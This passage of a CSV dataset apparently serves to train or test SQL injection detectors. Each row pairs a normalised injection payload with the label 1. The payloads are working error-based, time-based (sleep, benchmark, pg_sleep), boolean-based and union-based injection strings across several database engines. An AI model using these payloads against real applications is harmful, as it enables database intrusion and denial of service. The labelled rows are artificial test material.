row_index,payload_norm,label,sqli_type_hint
7470,"1 ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 9325 = 9325",1,
7471,"1, ( select ( case when ( 5154 = 5154 ) then 1 else 5154* ( select 5154 from master..sysdatabases ) end ) )",1,
7472,"-6014"" or make_set ( 3003 = 2609,2609 )",1,
7473,1 ) where 6424 = 6424,1,
7474,1%' or sleep ( 5 ) #,1,
7475,1' or sleep ( 5 ) and 'yudo' = 'yudo,1,
7476,1'|| ( select 'sxya' where 3578 = 3578,1,
7477,"1"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""nrhz"" like ""nrhz",1,
7478,"select * from generate_series ( 7667,7667,case when ( 7667 = 8232 ) then 1 else 0 end ) limit 1--",1,
7479,"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'lxoc' = 'lxoc",1,
7480,"1' where 4150 = 4150 and elt ( 8012 = 6026,6026 ) --",1,
7481,"1,iif ( 6333 = 1227,1,1/0 )",1,
7482,"1 ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
7483,"1"" ) as jqli where 7793 = 7793",1,
7484,1' ) ) ) and 6991 = 5579,1,
7485,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ),1,
7486,1 where 1568 = 1568 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
7487,"1 ) as idvt where 3490 = 3490 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
7488,"1"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
7489,"1' where 1093 = 1093 union all select null,null,null,null,null,null,null--",1,
7490,( select * from ( select ( sleep ( 5 ) ) ) acdk ) #,1,
7491,1'+ ( select 'kcix' where 1117 = 1117,1,
7492,1'+ ( select 'jaok' where 2592 = 2592,1,
7493,"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ossj' = 'ossj",1,
7494,"1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'aqdj' = 'aqdj",1,
7495,"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
7496,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""pdqm"" like ""pdqm",1,
7497,"1',exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,
7498,"1"" ) ) as jebl where 3464 = 3464",1,
7499,"-3632' or make_set ( 9354 = 9354,7185 ) and 'lgpy' like 'lgpy",1,
